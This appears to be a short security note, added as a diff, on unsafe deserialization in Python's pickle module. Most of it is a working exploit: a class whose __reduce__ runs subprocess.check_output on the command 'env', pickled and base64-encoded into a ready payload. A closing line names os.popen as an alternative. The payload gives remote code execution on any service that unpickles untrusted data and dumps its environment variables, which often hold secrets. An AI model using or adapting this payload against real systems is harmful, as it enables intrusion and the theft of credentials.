@@ -1,0 +1,34 @@
+The pickle module is vulnerable to unsafe deserialization of Python objects.
+
+Exploit:
+
+@code python
+DEFAULT_COMMAND = ['env']
+
+import pickle
+import base64
+import requests
+
+#COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    ''' __reduce__ can return either a string or a tuple. If it returns a string, then it should be the name of a global variable. If it returns a tuple, it should be in the following syntax: callable, (args), *object's state (will be passed to __setstate__(), *iterator of items (for list subclasses), *iterator of key-value pairs (for dict subclasses or if the class implements __setitem__()), *(obj, state) to set state of class (overriding __setstate__() if implemented)
+
+    The one we are interested in for RCE is callable, (args)
+
+    This has been implemented below.
+    '''
+
+    def __reduce__(self):
+        import subprocess
+        #import os
+        return subprocess.check_output, (DEFAULT_COMMAND,)
+
+def gen_payload():
+    payload = bytes.decode(base64.b64encode(pickle.dumps(PickleRce())), 'utf-8')
+    return payload
+
+print(gen_payload())
+@end
+
+Instead of `subprocess.check_output`, we can also use `os.popen().read()`, but note that on Windows, there is an issue serializing the `os` module which becomes `nt` module for some reason.
